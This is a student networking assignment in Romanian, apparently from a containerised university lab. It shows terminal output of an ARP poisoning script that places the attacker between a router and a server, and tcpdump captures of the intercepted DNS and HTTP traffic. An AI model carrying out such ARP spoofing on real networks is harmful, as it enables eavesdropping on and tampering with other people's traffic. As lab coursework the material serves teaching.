# Tema 5

## 1. ARP Spoofing (5%)

```
root@685d4911a7e4:/elocal/tema5/src# python3 arp_poison.py 
[*] Pornire script captare
[*] IP router: 198.7.0.1
[*] IP server: 198.7.0.2
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
Raspuns adresa MAC pentru IP-ul 198.7.0.1: 
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = 02:42:c6:07:00:01
  psrc      = 198.7.0.1
  hwdst     = 02:42:c6:07:00:03
  pdst      = 198.7.0.3

None
[*] Adresa MAC obtinuta pentru router: 02:42:c6:07:00:01
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
Raspuns adresa MAC pentru IP-ul 198.7.0.2: 
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = 02:42:c6:07:00:02
  psrc      = 198.7.0.2
  hwdst     = 02:42:c6:07:00:03
  pdst      = 198.7.0.3

None
[*] Adresa MAC obtinuta pentru server: 02:42:c6:07:00:02
[*] Started ARP poison attack [CTRL-C to stop]
[*] Se capteaza traficul. Numarul maxim de pachete captate: 100. Filtru: ip host 198.7.0.2
-------------
Informam routerul de faptul ca noi suntem serverul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.2
  hwdst     = 02:42:c6:07:00:01
  pdst      = 198.7.0.1

Informam serverul de faptul ca noi suntem routerul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.1
  hwdst     = 02:42:c6:07:00:02
  pdst      = 198.7.0.2

------------------
-------------
Informam routerul de faptul ca noi suntem serverul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.2
  hwdst     = 02:42:c6:07:00:01
  pdst      = 198.7.0.1

Informam serverul de faptul ca noi suntem routerul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.1
  hwdst     = 02:42:c6:07:00:02
  pdst      = 198.7.0.2

------------------
-------------
Informam routerul de faptul ca noi suntem serverul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.2
  hwdst     = 02:42:c6:07:00:01
  pdst      = 198.7.0.1

Informam serverul de faptul ca noi suntem routerul
.
Sent 1 packets.
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 02:42:c6:07:00:03
  psrc      = 198.7.0.1
  hwdst     = 02:42:c6:07:00:02
  pdst      = 198.7.0.2

------------------
^CNone -> Oprire fortata de la tastatura
[*] Se opreste captarea si se scrie in fisierul .pcap. Se reface conexiunea initiala.
.....
Sent 5 packets.
.....
Sent 5 packets.
Terminated
root@685d4911a7e4:/elocal/tema5/src# 

```

### Output tcpdump

Rulați pe `middle` comanda `tcpdump -SntvXX -i any` și salvați log-urile aici. Încercați să salvați doar cateva care conțin HTML-ul de la request-ul din server.
```
root@685d4911a7e4:/# tcpdump -SntvXX -i any
IP (tos 0x0, ttl 64, id 33180, offset 0, flags [DF], proto UDP (17), length 66)
    198.7.0.2.33047 > 192.168.0.1.53: 34646+ A? moodle.fmi.unibuc.ro. (38)
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0042 819c 4000 4011 325c c607 0002  E..B..@.@.2\....
	0x0020:  c0a8 0001 8117 0035 002e 86f2 8756 0100  .......5.....V..
	0x0030:  0001 0000 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 0001  fmi.unibuc.ro...
	0x0050:  0001                                     ..
IP (tos 0x0, ttl 64, id 32551, offset 0, flags [DF], proto UDP (17), length 66)
    198.7.0.2.44449 > 192.168.0.1.53: 62299+ AAAA? moodle.fmi.unibuc.ro. (38)
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0042 7f27 4000 4011 34d1 c607 0002  E..B.'@.@.4.....
	0x0020:  c0a8 0001 ada1 0035 002e 86f2 f35b 0100  .......5.....[..
	0x0030:  0001 0000 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 001c  fmi.unibuc.ro...
	0x0050:  0001                                     ..
IP (tos 0x0, ttl 63, id 33180, offset 0, flags [DF], proto UDP (17), length 66)
    198.7.0.3.33047 > 192.168.0.1.53: 34646+ A? moodle.fmi.unibuc.ro. (38)
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0042 819c 4000 3f11 335b c607 0003  E..B..@.?.3[....
	0x0020:  c0a8 0001 8117 0035 002e 86f3 8756 0100  .......5.....V..
	0x0030:  0001 0000 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 0001  fmi.unibuc.ro...
	0x0050:  0001                                     ..
IP (tos 0x0, ttl 63, id 32551, offset 0, flags [DF], proto UDP (17), length 66)
    198.7.0.3.44449 > 192.168.0.1.53: 62299+ AAAA? moodle.fmi.unibuc.ro. (38)
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0042 7f27 4000 3f11 35d0 c607 0003  E..B.'@.?.5.....
	0x0020:  c0a8 0001 ada1 0035 002e 86f3 f35b 0100  .......5.....[..
	0x0030:  0001 0000 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 001c  fmi.unibuc.ro...
	0x0050:  0001                                     ..
IP (tos 0x0, ttl 63, id 22799, offset 0, flags [none], proto UDP (17), length 82)
    192.168.0.1.53 > 198.7.0.3.33047: 34646* 1/0/0 moodle.fmi.unibuc.ro. A 193.226.51.9 (54)
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0052 590f 0000 3f11 9bd8 c0a8 0001  E..RY...?.......
	0x0020:  c607 0003 0035 8117 003e 6131 8756 8580  .....5...>a1.V..
	0x0030:  0001 0001 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 0001  fmi.unibuc.ro...
	0x0050:  0001 c00c 0001 0001 0000 0000 0004 c1e2  ................
	0x0060:  3309                                     3.
IP (tos 0x0, ttl 62, id 22799, offset 0, flags [none], proto UDP (17), length 82)
    192.168.0.1.53 > 198.7.0.2.33047: 34646* 1/0/0 moodle.fmi.unibuc.ro. A 193.226.51.9 (54)
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0052 590f 0000 3e11 9cd9 c0a8 0001  E..RY...>.......
	0x0020:  c607 0002 0035 8117 003e 6132 8756 8580  .....5...>a2.V..
	0x0030:  0001 0001 0000 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 0001  fmi.unibuc.ro...
	0x0050:  0001 c00c 0001 0001 0000 0000 0004 c1e2  ................
	0x0060:  3309                                     3.
IP (tos 0x0, ttl 63, id 22800, offset 0, flags [none], proto UDP (17), length 116)
    192.168.0.1.53 > 198.7.0.3.44449: 62299 0/1/0 (88)
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0074 5910 0000 3f11 9bb5 c0a8 0001  E..tY...?.......
	0x0020:  c607 0003 0035 ada1 0060 e2c5 f35b 8180  .....5...`...[..
	0x0030:  0001 0000 0001 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 001c  fmi.unibuc.ro...
	0x0050:  0001 c013 0006 0001 0000 2450 0026 036e  ..........$P.&.n
	0x0060:  7331 c013 0977 6562 6d61 7374 6572 c013  s1...webmaster..
	0x0070:  7867 8aff 0000 7080 0000 0e10 0009 3a80  xg....p.......:.
	0x0080:  0001 5180                                ..Q.
IP (tos 0x0, ttl 62, id 22800, offset 0, flags [none], proto UDP (17), length 116)
    192.168.0.1.53 > 198.7.0.2.44449: 62299 0/1/0 (88)
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0074 5910 0000 3e11 9cb6 c0a8 0001  E..tY...>.......
	0x0020:  c607 0002 0035 ada1 0060 e2c6 f35b 8180  .....5...`...[..
	0x0030:  0001 0000 0001 0000 066d 6f6f 646c 6503  .........moodle.
	0x0040:  666d 6906 756e 6962 7563 0272 6f00 001c  fmi.unibuc.ro...
	0x0050:  0001 c013 0006 0001 0000 2450 0026 036e  ..........$P.&.n
	0x0060:  7331 c013 0977 6562 6d61 7374 6572 c013  s1...webmaster..
	0x0070:  7867 8aff 0000 7080 0000 0e10 0009 3a80  xg....p.......:.
	0x0080:  0001 5180                                ..Q.
IP (tos 0x0, ttl 64, id 27490, offset 0, flags [DF], proto TCP (6), length 60)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [S], cksum 0xbb23 (incorrect -> 0xbab5), seq 4029134468, win 64240, options [mss 1460,sackOK,TS val 3077947339 ecr 0,nop,wscale 7], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 003c 6b62 4000 4006 1465 c607 0002  E..<kb@.@..e....
	0x0020:  c1e2 3309 b926 0050 f027 b684 0000 0000  ..3..&.P.'......
	0x0030:  a002 faf0 bb23 0000 0204 05b4 0402 080a  .....#..........
	0x0040:  b775 bfcb 0000 0000 0103 0307            .u..........
IP (tos 0x0, ttl 63, id 27490, offset 0, flags [DF], proto TCP (6), length 60)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [S], cksum 0xbb24 (incorrect -> 0xbab4), seq 4029134468, win 64240, options [mss 1460,sackOK,TS val 3077947339 ecr 0,nop,wscale 7], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 003c 6b62 4000 3f06 1564 c607 0003  E..<kb@.?..d....
	0x0020:  c1e2 3309 b926 0050 f027 b684 0000 0000  ..3..&.P.'......
	0x0030:  a002 faf0 bb24 0000 0204 05b4 0402 080a  .....$..........
	0x0040:  b775 bfcb 0000 0000 0103 0307            .u..........
IP (tos 0x0, ttl 47, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    193.226.51.9.80 > 198.7.0.3.47398: Flags [S.], cksum 0x284a (correct), seq 3524465048, ack 4029134469, win 5792, options [mss 1380,sackOK,TS val 2477391780 ecr 3077947339,nop,wscale 7], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 003c 0000 4000 2f06 90c6 c1e2 3309  E..<..@./.....3.
	0x0020:  c607 0003 0050 b926 d213 1198 f027 b685  .....P.&.....'..
	0x0030:  a012 16a0 284a 0000 0204 0564 0402 080a  ....(J.....d....
	0x0040:  93a9 ffa4 b775 bfcb 0103 0307            .....u......
IP (tos 0x0, ttl 46, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    193.226.51.9.80 > 198.7.0.2.47398: Flags [S.], cksum 0x284b (correct), seq 3524465048, ack 4029134469, win 5792, options [mss 1380,sackOK,TS val 2477391780 ecr 3077947339,nop,wscale 7], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 003c 0000 4000 2e06 91c7 c1e2 3309  E..<..@.......3.
	0x0020:  c607 0002 0050 b926 d213 1198 f027 b685  .....P.&.....'..
	0x0030:  a012 16a0 284b 0000 0204 0564 0402 080a  ....(K.....d....
	0x0040:  93a9 ffa4 b775 bfcb 0103 0307            .....u......
IP (tos 0x0, ttl 64, id 27491, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1b (incorrect -> 0x6b5a), ack 3524465049, win 502, options [nop,nop,TS val 3077947362 ecr 2477391780], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 6b63 4000 4006 146c c607 0002  E..4kc@.@..l....
	0x0020:  c1e2 3309 b926 0050 f027 b685 d213 1199  ..3..&.P.'......
	0x0030:  8010 01f6 bb1b 0000 0101 080a b775 bfe2  .............u..
	0x0040:  93a9 ffa4                                ....
IP (tos 0x0, ttl 63, id 27491, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1c (incorrect -> 0x6b59), ack 3524465049, win 502, options [nop,nop,TS val 3077947362 ecr 2477391780], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 6b63 4000 3f06 156b c607 0003  E..4kc@.?..k....
	0x0020:  c1e2 3309 b926 0050 f027 b685 d213 1199  ..3..&.P.'......
	0x0030:  8010 01f6 bb1c 0000 0101 080a b775 bfe2  .............u..
	0x0040:  93a9 ffa4                                ....
IP (tos 0x0, ttl 64, id 27492, offset 0, flags [DF], proto TCP (6), length 199)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [P.], cksum 0xbbae (incorrect -> 0xa70a), seq 4029134469:4029134616, ack 3524465049, win 502, options [nop,nop,TS val 3077947362 ecr 2477391780], length 147: HTTP, length: 147
	GET / HTTP/1.1
	User-Agent: Wget/1.20.3 (linux-gnu)
	Accept: */*
	Accept-Encoding: identity
	Host: moodle.fmi.unibuc.ro
	Connection: Keep-Alive
	
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 00c7 6b64 4000 4006 13d8 c607 0002  E...kd@.@.......
	0x0020:  c1e2 3309 b926 0050 f027 b685 d213 1199  ..3..&.P.'......
	0x0030:  8018 01f6 bbae 0000 0101 080a b775 bfe2  .............u..
	0x0040:  93a9 ffa4 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
	0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
	0x0060:  5767 6574 2f31 2e32 302e 3320 286c 696e  Wget/1.20.3.(lin
	0x0070:  7578 2d67 6e75 290d 0a41 6363 6570 743a  ux-gnu)..Accept:
	0x0080:  202a 2f2a 0d0a 4163 6365 7074 2d45 6e63  .*/*..Accept-Enc
	0x0090:  6f64 696e 673a 2069 6465 6e74 6974 790d  oding:.identity.
	0x00a0:  0a48 6f73 743a 206d 6f6f 646c 652e 666d  .Host:.moodle.fm
	0x00b0:  692e 756e 6962 7563 2e72 6f0d 0a43 6f6e  i.unibuc.ro..Con
	0x00c0:  6e65 6374 696f 6e3a 204b 6565 702d 416c  nection:.Keep-Al
	0x00d0:  6976 650d 0a0d 0a                        ive....
IP (tos 0x0, ttl 63, id 27492, offset 0, flags [DF], proto TCP (6), length 199)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [P.], cksum 0xbbaf (incorrect -> 0xa709), seq 4029134469:4029134616, ack 3524465049, win 502, options [nop,nop,TS val 3077947362 ecr 2477391780], length 147: HTTP, length: 147
	GET / HTTP/1.1
	User-Agent: Wget/1.20.3 (linux-gnu)
	Accept: */*
	Accept-Encoding: identity
	Host: moodle.fmi.unibuc.ro
	Connection: Keep-Alive
	
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 00c7 6b64 4000 3f06 14d7 c607 0003  E...kd@.?.......
	0x0020:  c1e2 3309 b926 0050 f027 b685 d213 1199  ..3..&.P.'......
	0x0030:  8018 01f6 bbaf 0000 0101 080a b775 bfe2  .............u..
	0x0040:  93a9 ffa4 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
	0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
	0x0060:  5767 6574 2f31 2e32 302e 3320 286c 696e  Wget/1.20.3.(lin
	0x0070:  7578 2d67 6e75 290d 0a41 6363 6570 743a  ux-gnu)..Accept:
	0x0080:  202a 2f2a 0d0a 4163 6365 7074 2d45 6e63  .*/*..Accept-Enc
	0x0090:  6f64 696e 673a 2069 6465 6e74 6974 790d  oding:.identity.
	0x00a0:  0a48 6f73 743a 206d 6f6f 646c 652e 666d  .Host:.moodle.fm
	0x00b0:  692e 756e 6962 7563 2e72 6f0d 0a43 6f6e  i.unibuc.ro..Con
	0x00c0:  6e65 6374 696f 6e3a 204b 6565 702d 416c  nection:.Keep-Al
	0x00d0:  6976 650d 0a0d 0a                        ive....
IP (tos 0x0, ttl 47, id 1851, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.80 > 198.7.0.3.47398: Flags [.], cksum 0x6c80 (correct), ack 4029134616, win 54, options [nop,nop,TS val 2477391786 ecr 3077947362], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0034 073b 4000 2f06 8993 c1e2 3309  E..4.;@./.....3.
	0x0020:  c607 0003 0050 b926 d213 1199 f027 b718  .....P.&.....'..
	0x0030:  8010 0036 6c80 0000 0101 080a 93a9 ffaa  ...6l...........
	0x0040:  b775 bfe2                                .u..
IP (tos 0x0, ttl 46, id 1851, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.80 > 198.7.0.2.47398: Flags [.], cksum 0x6c81 (correct), ack 4029134616, win 54, options [nop,nop,TS val 2477391786 ecr 3077947362], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 073b 4000 2e06 8a94 c1e2 3309  E..4.;@.......3.
	0x0020:  c607 0002 0050 b926 d213 1199 f027 b718  .....P.&.....'..
	0x0030:  8010 0036 6c81 0000 0101 080a 93a9 ffaa  ...6l...........
	0x0040:  b775 bfe2                                .u..
IP (tos 0x0, ttl 47, id 1852, offset 0, flags [DF], proto TCP (6), length 629)
    193.226.51.9.80 > 198.7.0.3.47398: Flags [P.], cksum 0x0aa2 (correct), seq 3524465049:3524465626, ack 4029134616, win 54, options [nop,nop,TS val 2477391786 ecr 3077947362], length 577: HTTP, length: 577
	HTTP/1.1 302 Found
	Date: Mon, 29 Jun 2020 16:19:44 GMT
	Server: Apache/2.2.16 (Debian)
	Location: https://moodle.fmi.unibuc.ro/
	Vary: Accept-Encoding
	Content-Length: 299
	Keep-Alive: timeout=15, max=100
	Connection: Keep-Alive
	Content-Type: text/html; charset=iso-8859-1
	
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>302 Found</title>
	</head><body>
	<h1>Found</h1>
	<p>The document has moved <a href="https://moodle.fmi.unibuc.ro/">here</a>.</p>
	<hr>
	<address>Apache/2.2.16 (Debian) Server at moodle.fmi.unibuc.ro Port 80</address>
	</body></html>
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0275 073c 4000 2f06 8751 c1e2 3309  E..u.<@./..Q..3.
	0x0020:  c607 0003 0050 b926 d213 1199 f027 b718  .....P.&.....'..
	0x0030:  8018 0036 0aa2 0000 0101 080a 93a9 ffaa  ...6............
	0x0040:  b775 bfe2 4854 5450 2f31 2e31 2033 3032  .u..HTTP/1.1.302
	0x0050:  2046 6f75 6e64 0d0a 4461 7465 3a20 4d6f  .Found..Date:.Mo
	0x0060:  6e2c 2032 3920 4a75 6e20 3230 3230 2031  n,.29.Jun.2020.1
	0x0070:  363a 3139 3a34 3420 474d 540d 0a53 6572  6:19:44.GMT..Ser
	0x0080:  7665 723a 2041 7061 6368 652f 322e 322e  ver:.Apache/2.2.
	0x0090:  3136 2028 4465 6269 616e 290d 0a4c 6f63  16.(Debian)..Loc
	0x00a0:  6174 696f 6e3a 2068 7474 7073 3a2f 2f6d  ation:.https://m
	0x00b0:  6f6f 646c 652e 666d 692e 756e 6962 7563  oodle.fmi.unibuc
	0x00c0:  2e72 6f2f 0d0a 5661 7279 3a20 4163 6365  .ro/..Vary:.Acce
	0x00d0:  7074 2d45 6e63 6f64 696e 670d 0a43 6f6e  pt-Encoding..Con
	0x00e0:  7465 6e74 2d4c 656e 6774 683a 2032 3939  tent-Length:.299
	0x00f0:  0d0a 4b65 6570 2d41 6c69 7665 3a20 7469  ..Keep-Alive:.ti
	0x0100:  6d65 6f75 743d 3135 2c20 6d61 783d 3130  meout=15,.max=10
	0x0110:  300d 0a43 6f6e 6e65 6374 696f 6e3a 204b  0..Connection:.K
	0x0120:  6565 702d 416c 6976 650d 0a43 6f6e 7465  eep-Alive..Conte
	0x0130:  6e74 2d54 7970 653a 2074 6578 742f 6874  nt-Type:.text/ht
	0x0140:  6d6c 3b20 6368 6172 7365 743d 6973 6f2d  ml;.charset=iso-
	0x0150:  3838 3539 2d31 0d0a 0d0a 3c21 444f 4354  8859-1....<!DOCT
	0x0160:  5950 4520 4854 4d4c 2050 5542 4c49 4320  YPE.HTML.PUBLIC.
	0x0170:  222d 2f2f 4945 5446 2f2f 4454 4420 4854  "-//IETF//DTD.HT
	0x0180:  4d4c 2032 2e30 2f2f 454e 223e 0a3c 6874  ML.2.0//EN">.<ht
	0x0190:  6d6c 3e3c 6865 6164 3e0a 3c74 6974 6c65  ml><head>.<title
	0x01a0:  3e33 3032 2046 6f75 6e64 3c2f 7469 746c  >302.Found</titl
	0x01b0:  653e 0a3c 2f68 6561 643e 3c62 6f64 793e  e>.</head><body>
	0x01c0:  0a3c 6831 3e46 6f75 6e64 3c2f 6831 3e0a  .<h1>Found</h1>.
	0x01d0:  3c70 3e54 6865 2064 6f63 756d 656e 7420  <p>The.document.
	0x01e0:  6861 7320 6d6f 7665 6420 3c61 2068 7265  has.moved.<a.hre
	0x01f0:  663d 2268 7474 7073 3a2f 2f6d 6f6f 646c  f="https://moodl
	0x0200:  652e 666d 692e 756e 6962 7563 2e72 6f2f  e.fmi.unibuc.ro/
	0x0210:  223e 6865 7265 3c2f 613e 2e3c 2f70 3e0a  ">here</a>.</p>.
	0x0220:  3c68 723e 0a3c 6164 6472 6573 733e 4170  <hr>.<address>Ap
	0x0230:  6163 6865 2f32 2e32 2e31 3620 2844 6562  ache/2.2.16.(Deb
	0x0240:  6961 6e29 2053 6572 7665 7220 6174 206d  ian).Server.at.m
	0x0250:  6f6f 646c 652e 666d 692e 756e 6962 7563  oodle.fmi.unibuc
	0x0260:  2e72 6f20 506f 7274 2038 303c 2f61 6464  .ro.Port.80</add
	0x0270:  7265 7373 3e0a 3c2f 626f 6479 3e3c 2f68  ress>.</body></h
	0x0280:  746d 6c3e 0a                             tml>.
IP (tos 0x0, ttl 46, id 1852, offset 0, flags [DF], proto TCP (6), length 629)
    193.226.51.9.80 > 198.7.0.2.47398: Flags [P.], cksum 0x0aa3 (correct), seq 3524465049:3524465626, ack 4029134616, win 54, options [nop,nop,TS val 2477391786 ecr 3077947362], length 577: HTTP, length: 577
	HTTP/1.1 302 Found
	Date: Mon, 29 Jun 2020 16:19:44 GMT
	Server: Apache/2.2.16 (Debian)
	Location: https://moodle.fmi.unibuc.ro/
	Vary: Accept-Encoding
	Content-Length: 299
	Keep-Alive: timeout=15, max=100
	Connection: Keep-Alive
	Content-Type: text/html; charset=iso-8859-1
	
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>302 Found</title>
	</head><body>
	<h1>Found</h1>
	<p>The document has moved <a href="https://moodle.fmi.unibuc.ro/">here</a>.</p>
	<hr>
	<address>Apache/2.2.16 (Debian) Server at moodle.fmi.unibuc.ro Port 80</address>
	</body></html>
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0275 073c 4000 2e06 8852 c1e2 3309  E..u.<@....R..3.
	0x0020:  c607 0002 0050 b926 d213 1199 f027 b718  .....P.&.....'..
	0x0030:  8018 0036 0aa3 0000 0101 080a 93a9 ffaa  ...6............
	0x0040:  b775 bfe2 4854 5450 2f31 2e31 2033 3032  .u..HTTP/1.1.302
	0x0050:  2046 6f75 6e64 0d0a 4461 7465 3a20 4d6f  .Found..Date:.Mo
	0x0060:  6e2c 2032 3920 4a75 6e20 3230 3230 2031  n,.29.Jun.2020.1
	0x0070:  363a 3139 3a34 3420 474d 540d 0a53 6572  6:19:44.GMT..Ser
	0x0080:  7665 723a 2041 7061 6368 652f 322e 322e  ver:.Apache/2.2.
	0x0090:  3136 2028 4465 6269 616e 290d 0a4c 6f63  16.(Debian)..Loc
	0x00a0:  6174 696f 6e3a 2068 7474 7073 3a2f 2f6d  ation:.https://m
	0x00b0:  6f6f 646c 652e 666d 692e 756e 6962 7563  oodle.fmi.unibuc
	0x00c0:  2e72 6f2f 0d0a 5661 7279 3a20 4163 6365  .ro/..Vary:.Acce
	0x00d0:  7074 2d45 6e63 6f64 696e 670d 0a43 6f6e  pt-Encoding..Con
	0x00e0:  7465 6e74 2d4c 656e 6774 683a 2032 3939  tent-Length:.299
	0x00f0:  0d0a 4b65 6570 2d41 6c69 7665 3a20 7469  ..Keep-Alive:.ti
	0x0100:  6d65 6f75 743d 3135 2c20 6d61 783d 3130  meout=15,.max=10
	0x0110:  300d 0a43 6f6e 6e65 6374 696f 6e3a 204b  0..Connection:.K
	0x0120:  6565 702d 416c 6976 650d 0a43 6f6e 7465  eep-Alive..Conte
	0x0130:  6e74 2d54 7970 653a 2074 6578 742f 6874  nt-Type:.text/ht
	0x0140:  6d6c 3b20 6368 6172 7365 743d 6973 6f2d  ml;.charset=iso-
	0x0150:  3838 3539 2d31 0d0a 0d0a 3c21 444f 4354  8859-1....<!DOCT
	0x0160:  5950 4520 4854 4d4c 2050 5542 4c49 4320  YPE.HTML.PUBLIC.
	0x0170:  222d 2f2f 4945 5446 2f2f 4454 4420 4854  "-//IETF//DTD.HT
	0x0180:  4d4c 2032 2e30 2f2f 454e 223e 0a3c 6874  ML.2.0//EN">.<ht
	0x0190:  6d6c 3e3c 6865 6164 3e0a 3c74 6974 6c65  ml><head>.<title
	0x01a0:  3e33 3032 2046 6f75 6e64 3c2f 7469 746c  >302.Found</titl
	0x01b0:  653e 0a3c 2f68 6561 643e 3c62 6f64 793e  e>.</head><body>
	0x01c0:  0a3c 6831 3e46 6f75 6e64 3c2f 6831 3e0a  .<h1>Found</h1>.
	0x01d0:  3c70 3e54 6865 2064 6f63 756d 656e 7420  <p>The.document.
	0x01e0:  6861 7320 6d6f 7665 6420 3c61 2068 7265  has.moved.<a.hre
	0x01f0:  663d 2268 7474 7073 3a2f 2f6d 6f6f 646c  f="https://moodl
	0x0200:  652e 666d 692e 756e 6962 7563 2e72 6f2f  e.fmi.unibuc.ro/
	0x0210:  223e 6865 7265 3c2f 613e 2e3c 2f70 3e0a  ">here</a>.</p>.
	0x0220:  3c68 723e 0a3c 6164 6472 6573 733e 4170  <hr>.<address>Ap
	0x0230:  6163 6865 2f32 2e32 2e31 3620 2844 6562  ache/2.2.16.(Deb
	0x0240:  6961 6e29 2053 6572 7665 7220 6174 206d  ian).Server.at.m
	0x0250:  6f6f 646c 652e 666d 692e 756e 6962 7563  oodle.fmi.unibuc
	0x0260:  2e72 6f20 506f 7274 2038 303c 2f61 6464  .ro.Port.80</add
	0x0270:  7265 7373 3e0a 3c2f 626f 6479 3e3c 2f68  ress>.</body></h
	0x0280:  746d 6c3e 0a                             tml>.
IP (tos 0x0, ttl 64, id 27493, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1b (incorrect -> 0x686c), ack 3524465626, win 498, options [nop,nop,TS val 3077947386 ecr 2477391786], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 6b65 4000 4006 146a c607 0002  E..4ke@.@..j....
	0x0020:  c1e2 3309 b926 0050 f027 b718 d213 13da  ..3..&.P.'......
	0x0030:  8010 01f2 bb1b 0000 0101 080a b775 bffa  .............u..
	0x0040:  93a9 ffaa                                ....
IP (tos 0x0, ttl 63, id 27493, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1c (incorrect -> 0x686b), ack 3524465626, win 498, options [nop,nop,TS val 3077947386 ecr 2477391786], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 6b65 4000 3f06 1569 c607 0003  E..4ke@.?..i....
	0x0020:  c1e2 3309 b926 0050 f027 b718 d213 13da  ..3..&.P.'......
	0x0030:  8010 01f2 bb1c 0000 0101 080a b775 bffa  .............u..
	0x0040:  93a9 ffaa                                ....
IP (tos 0x0, ttl 64, id 18020, offset 0, flags [DF], proto TCP (6), length 60)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [S], cksum 0xbb23 (incorrect -> 0x03b6), seq 3621697773, win 64240, options [mss 1460,sackOK,TS val 3077947408 ecr 0,nop,wscale 7], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 003c 4664 4000 4006 3963 c607 0002  E..<Fd@.@.9c....
	0x0020:  c1e2 3309 8456 01bb d7de b8ed 0000 0000  ..3..V..........
	0x0030:  a002 faf0 bb23 0000 0204 05b4 0402 080a  .....#..........
